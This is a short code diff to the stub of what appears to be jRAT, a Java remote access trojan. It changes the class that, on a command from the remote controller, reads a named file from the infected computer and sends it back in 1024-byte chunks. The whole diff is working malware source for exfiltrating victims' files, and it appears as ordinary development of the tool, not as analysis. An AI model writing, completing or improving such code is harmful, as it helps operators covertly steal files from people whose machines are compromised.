@@ -1,11 +1,12 @@
 package se.jrat.stub.packets.incoming;
 
 import java.io.File;
+import java.io.FileInputStream;
 
 import se.jrat.common.io.FileIO;
 import se.jrat.stub.Connection;
 import se.jrat.stub.Main;
-import se.jrat.stub.packets.outgoing.Packet29ClientUploadFile;
+import se.jrat.stub.packets.outgoing.Packet29ClientUploadPart;
 
 
 public class Packet21ClientUploadFile extends AbstractIncomingPacket {
@@ -15,12 +16,15 @@ public class Packet21ClientUploadFile extends AbstractIncomingPacket {
 		File file = new File(Connection.readLine());
 
 		if (file.exists() && file.isFile()) {
-			Connection.addToSendQueue(new Packet29ClientUploadFile(file.getName(), file.getAbsolutePath()));
+			FileInputStream fileInput = new FileInputStream(file);
+			byte[] chunk = new byte[1024];
 
-			FileIO fileio = new FileIO();
-			fileio.writeFile(file, Connection.socket, Connection.dos, Connection.dis, null, Main.getKey());
-
-			Connection.lock();
+			for (long pos = 0; pos < file.length(); pos += 1024) {
+				int read = fileInput.read(chunk);
+				
+				Connection.addToSendQueue(new Packet29ClientUploadPart(file, chunk, read));
+			}
+			fileInput.close();
 		}
 	}
 
